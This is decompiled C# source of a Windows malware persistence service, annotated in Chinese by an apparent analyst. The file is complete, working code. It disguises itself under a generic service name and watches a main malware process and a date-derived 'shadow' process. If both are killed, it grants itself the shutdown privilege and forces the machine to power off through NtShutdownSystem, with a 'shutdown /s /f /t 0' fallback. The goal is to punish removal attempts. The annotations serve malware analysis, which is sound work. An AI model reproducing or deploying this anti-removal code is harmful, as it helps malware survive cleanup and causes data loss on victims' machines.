using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Timers;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace zmserv
{
	// Token: 0x0200000A RID: 10
	/// <summary>
	/// ProcessMonitorService —— Windows 防卸载监控服务（看门狗，恶意核心逻辑）。
	/// 行为链：每 30 秒扫描 jfglzsn → 发现后切换 5 秒紧轮询 → 影子进程与 jfglzsn 同时消失累计 16 次（约 80 秒）
	/// → RtlAdjustPrivilege(19) 自提权 + NtShutdownSystem(2) 强制关机，并 shutdown /s /f /t 0 兜底，
	/// 使受害者无法轻易清除恶意软件（杀毒/杀进程 → 整机断电）。
	/// </summary>
	[DesignerGenerated]
	public class ProcessMonitorService : ServiceBase
	{
		// Token: 0x06000025 RID: 37 RVA: 0x000025CC File Offset: 0x000007CC
		/// <summary>
		/// 构造函数：初始化安装目录字段 installDirectory（C:\windows\jf）并调用 InitializeService 完成服务初始化。
		/// 注意：installDirectory 赋值后在本类其余代码中未被引用，属安装目录痕迹/待用常量。
		/// </summary>
		public ProcessMonitorService()
		{
			this.installDirectory = "C:\\windows\\jf";
			this.InitializeService();
		}

		// Token: 0x06000026 RID: 38 RVA: 0x000025F0 File Offset: 0x000007F0
		/// <summary>
		/// 释放资源：disposing 为 true 时释放组件容器 componentsContainer，随后调用基类 Dispose。
		/// </summary>
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.componentsContainer != null)
				{
					this.componentsContainer.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00002630 File Offset: 0x00000830
		/// <summary>
		/// 服务进程入口点（MTAThread）：创建单个 ProcessMonitorService 实例数组并交给 ServiceBase.Run 由 SCM 运行。
		/// </summary>
		[MTAThread]
		public static void Main()
		{
			ServiceBase[] services = new ServiceBase[]
			{
				new ProcessMonitorService()
			};
			ServiceBase.Run(services);
		}

		// Token: 0x06000028 RID: 40 RVA: 0x000021F9 File Offset: 0x000003F9
		/// <summary>
		/// 初始化服务：创建组件容器 componentsContainer，并将服务名设为 "Service1"（伪装成泛化服务名）。
		/// </summary>
		private void InitializeService()
		{
			this.componentsContainer = new Container();
			this.ServiceName = "Service1";
		}

		// Token: 0x06000029 RID: 41
		/// <summary>
		/// P/Invoke：ntdll.RtlAdjustPrivilege —— 调整进程/线程特权（此处用于启用 SeShutdownPrivilege 关机特权）。
		/// 参数：int_0=特权编号、int_1=启用/禁用标志、int_2=是否仅当前线程、int_3=输出原特权状态。
		/// </summary>
		[DllImport("ntdll.dll")]
		private static extern int RtlAdjustPrivilege(int int_0, int int_1, int int_2, ref int int_3);

		// Token: 0x0600002A RID: 42
		/// <summary>
		/// P/Invoke：ntdll.NtShutdownSystem —— 直接触发系统关机/重启（2=关机、1=重启），不经正常关机流程。
		/// </summary>
		[DllImport("ntdll.dll")]
		private static extern int NtShutdownSystem(int int_0);

		// Token: 0x0600002B RID: 43 RVA: 0x00002654 File Offset: 0x00000854
		/// <summary>
		/// 服务启动：生成"每日确定"的 5 字符影子进程名，并启动 30 秒扫描定时器 scanTimer30s。
		/// 流程要点：① 按月×日播种 VB Rnd 生成 1~300001 伪随机数，取末位映射为 i~r 字符（chr(d+105)）逆序拼出 5 字符名；
		/// ② 先构造的 4 字符名随后被覆盖，属混淆残留/死代码；③ 清零 shutdownCounter；④ 创建 30000ms 定时器进入扫描循环。
		/// </summary>
		protected override void OnStart(string[] args)
		{
			checked
			{
				int num = DateAndTime.Month(DateAndTime.Now) * DateAndTime.Day(DateAndTime.Now);
				int num2 = num % 7;
				int num3 = num % 9;
				int num4 = num % 5;
				int num5 = num % 3;
				string text;
				if (num % 2 == 0)
				{
					text = Conversions.ToString(Strings.Chr(97 + num2)) + Conversions.ToString(Strings.Chr(98 + num3)) + Conversions.ToString(Strings.Chr(101 + num4)) + Conversions.ToString(Strings.Chr(99 + num5));
				}
				else
				{
					text = Conversions.ToString(Strings.Chr(97 + num3)) + Conversions.ToString(Strings.Chr(98 + num2)) + Conversions.ToString(Strings.Chr(101 + num5)) + Conversions.ToString(Strings.Chr(99 + num4));
				}
				this.shadowProcessName = text;
				this.shadowProcessFileName = text + ".exe";
				VBMath.Randomize((double)num);
				long num6 = (long)Math.Round(unchecked((double)VBMath.Rnd() * 100000.0 * 3.0 + 1.0));
				string text2 = "";
				int num7 = 1;
				do
				{
					long num8 = num6 % 10L + 105L;
					text2 = Conversions.ToString(Strings.Chr((int)num8)) + text2;
					num6 /= 10L;
					num7++;
				}
				while (num7 <= 5);
				this.shadowProcessName = text2;
				this.shadowProcessFileName = text2 + ".exe";
				this.shutdownCounter = 0L;
				this.scanTimer30s = new Timer(30000.0);
				this.scanTimer30s.AutoReset = true;
				this.scanTimer30s.Elapsed += this.ScanForMainProcess;
				this.scanTimer30s.Start();
			}
		}

		// Token: 0x0600002C RID: 44 RVA: 0x0000281C File Offset: 0x00000A1C
		/// <summary>
		/// 30 秒扫描回调：探测主进程 "jfglzsn" 是否存活。
		/// 流程：若 jfglzsn 存在 → 创建并启动 5 秒紧轮询定时器 watchdogTimer5s（Elapsed=WatchdogPoll），
		/// 随后停用本 30 秒定时器（看门狗武装完成）；若 jfglzsn 一直不出现，则服务仅空转扫描，看门狗不武装。
		/// </summary>
		private void ScanForMainProcess(object sender, ElapsedEventArgs e)
		{
			if (Process.GetProcessesByName("jfglzsn").Any<Process>())
			{
				this.watchdogTimer5s = new Timer(5000.0);
				this.watchdogTimer5s.AutoReset = true;
				this.watchdogTimer5s.Elapsed += this.WatchdogPoll;
				this.watchdogTimer5s.Start();
				this.scanTimer30s.Dispose();
				this.scanTimer30s = null;
			}
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00002890 File Offset: 0x00000A90
		/// <summary>
		/// 5 秒紧轮询回调：监控影子进程与 jfglzsn 是否同时消失，累计 16 次即触发强制关机。
		/// 流程：两进程均不存在 → shutdownCounter+1；≥16 次 → ForcePowerOff()（提权+NtShutdownSystem(2)），
		/// 并以 shutdown /s /f /t 0 兜底；任一进程存活 → shutdownCounter 归零（短暂消失容错）。
		/// </summary>
		private void WatchdogPoll(object sender, ElapsedEventArgs e)
		{
			checked
			{
				if (!Process.GetProcessesByName(this.shadowProcessName).Any<Process>() && !Process.GetProcessesByName("jfglzsn").Any<Process>())
				{
					this.shutdownCounter += 1L;
					if (this.shutdownCounter >= 16L)
					{
						ProcessMonitorService.ForcePowerOff();
						Process.Start("shutdown", "/s /f /t 0");
					}
				}
				else
				{
					this.shutdownCounter = 0L;
				}
			}
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00002914 File Offset: 0x00000B14
		/// <summary>
		/// 服务停止：停止并释放 watchdogTimer5s 与 scanTimer30s 两个定时器（非空时）。
		/// 注意：仅停定时器，不卸载服务注册；SCM 停止后进程退出。
		/// </summary>
		protected override void OnStop()
		{
			if (this.watchdogTimer5s != null)
			{
				this.watchdogTimer5s.Stop();
				this.watchdogTimer5s.Dispose();
			}
			if (this.scanTimer30s != null)
			{
				this.scanTimer30s.Stop();
				this.scanTimer30s.Dispose();
			}
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00002960 File Offset: 0x00000B60
		/// <summary>
		/// 强制关机（核心恶意动作）：开启当前线程 SeShutdownPrivilege（编号 19）后直接调用 NtShutdownSystem(2) 强制断电，无 UI、不保存。
		/// </summary>
		public static void ForcePowerOff()
		{
			int num = 0;
			ProcessMonitorService.RtlAdjustPrivilege(19, 1, 0, ref num);
			ProcessMonitorService.NtShutdownSystem(2);
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00002984 File Offset: 0x00000B84
		/// <summary>
		/// 强制重启（预留/死代码，当前流程未被调用）：开启 SeShutdownPrivilege 后调用 NtShutdownSystem(1)（1=重启）。
		/// </summary>
		public static void ForceReboot()
		{
			int num = 0;
			ProcessMonitorService.RtlAdjustPrivilege(19, 1, 0, ref num);
			ProcessMonitorService.NtShutdownSystem(1);
		}

		// Token: 0x04000009 RID: 9
		/// <summary>组件容器：设计器生成的组件容器，仅用于 Dispose 链。</summary>
		private IContainer componentsContainer;

		// Token: 0x0400000A RID: 10
		/// <summary>5 秒紧轮询定时器：发现 jfglzsn 后启动，监控双进程存活（周期 5000ms）。</summary>
		private Timer watchdogTimer5s;

		// Token: 0x0400000B RID: 11
		/// <summary>30 秒扫描定时器：轮询 jfglzsn 是否存在（AutoReset=true，周期 30000ms）。</summary>
		private Timer scanTimer30s;

		// Token: 0x0400000C RID: 12
		/// <summary>紧轮询周期常量：5000ms。</summary>
		private const int watchdogIntervalMs = 5000;

		// Token: 0x0400000D RID: 13
		/// <summary>扫描周期常量：30000ms。</summary>
		private const int scanIntervalMs = 30000;

		// Token: 0x0400000E RID: 14
		/// <summary>连续消失计数：双进程同时不存在的连续轮询次数，≥16 触发关机（约 80 秒）。</summary>
		private long shutdownCounter;

		// Token: 0x0400000F RID: 15
		/// <summary>影子进程名：按日期算法生成的 5 字符进程名（无 .exe），被监控对象之一。</summary>
		private string shadowProcessName;

		// Token: 0x04000010 RID: 16
		/// <summary>影子进程文件全名：shadowProcessName + ".exe"（预期位于 C:\windows\jf\）。</summary>
		private string shadowProcessFileName;

		// Token: 0x04000011 RID: 17
		/// <summary>SeShutdownPrivilege 特权编号：19（关机特权）。</summary>
		private const int shutdownPrivilegeId = 19;

		// Token: 0x04000012 RID: 18
		/// <summary>当前线程标志：0（只调整当前线程特权）。</summary>
		private const int currentThreadFlag = 0;

		// Token: 0x04000013 RID: 19
		/// <summary>启用特权标志：1（enable=TRUE）。</summary>
		private const int enablePrivilegeFlag = 1;

		// Token: 0x04000014 RID: 20
		/// <summary>NtShutdownSystem 动作码：2=关机（1=重启）。</summary>
		private const int shutdownActionCode = 2;

		// Token: 0x04000015 RID: 21
		/// <summary>安装目录：常量 "C:\windows\jf"（本体/影子进程存放目录；本类中仅赋值、未再引用）。</summary>
		private string installDirectory;
	}
}
